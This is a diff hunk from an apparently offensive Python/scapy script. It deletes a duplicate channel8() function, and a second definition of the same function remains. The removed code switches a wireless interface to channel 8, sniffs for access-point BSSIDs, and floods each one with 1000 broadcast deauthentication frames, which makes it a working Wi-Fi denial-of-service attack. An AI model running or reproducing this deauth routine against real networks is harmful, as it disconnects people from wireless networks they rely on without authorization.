@@ -374,58 +374,6 @@ def channel7():
    if os.path.isfile('7.txt'):
       os.remove('7.txt')
 
-
-def channel8():
-   os.system(f"iwconfig {interface} channel 8")
-   sleep(1)
-   os.system(f"iwconfig {interface} channel 8")
-
-   cccccccch = []
-   ch8= []
-
-   if os.path.isfile('8.txt'):
-      os.remove('8.txt')
-
-   print("Deauth All AP In Channel 8")
-   print("")
-
-   def callback_1(frame):
-      if frame.haslayer(Dot11):
-         if frame.haslayer(Dot11Beacon) or frame.haslayer(Dot11ProbeResp):
-            bssid = frame[Dot11].addr2
-            #print(bssid)
-            with open('8.txt', 'a') as file:
-               sys.stdout = file
-               print(bssid)
-            sys.stdout = sys.__stdout__
-
-   sniff(iface=interface, prn=callback_1, timeout=10)
-
-   if os.path.isfile('8.txt'):
-      with open('8.txt', 'r') as file:
-         for line in file:
-            cccccccch.append(line)
-   else:
-      print("Nothing found!")
-      print("Please check your Wi-Fi adapter")
-
-   for i in cccccccch:
-      if i not in ch8:
-         ch8.append(i)
-
-   print(f"Number Of AP: {len(ch8)}")
-   print("")
-   for i in ch8:
-      print("Deauth... ", i.upper())
-      conf.verb = 0
-      dot11 = Dot11(addr1="ff:ff:ff:ff:ff:ff", addr2=i, addr3=i)
-      frame = RadioTap()/dot11/Dot11Deauth()
-      sendp(frame, iface=interface, count=1000, inter=0.008)
-   print("===================================")  
-   if os.path.isfile('8.txt'):
-      os.remove('8.txt')
-
-
 def channel8():
    os.system(f"iwconfig {interface} channel 8")
    sleep(1)
